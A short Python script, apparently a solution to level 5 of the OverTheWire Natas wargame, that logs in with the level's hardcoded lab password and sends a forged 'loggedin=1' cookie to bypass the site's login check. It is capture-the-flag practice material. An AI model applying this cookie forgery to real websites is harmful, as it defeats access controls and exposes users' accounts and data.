import requests
from requests.auth import HTTPBasicAuth

session = requests.Session()

url = "http://natas5.natas.labs.overthewire.org/"

username="natas5"
password="iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

cookies = {
	"loggedin":"1"
}

req = session.get(url, auth=HTTPBasicAuth(username, password), cookies=cookies)

# print(req.cookies["loggedin"])

print(req.text)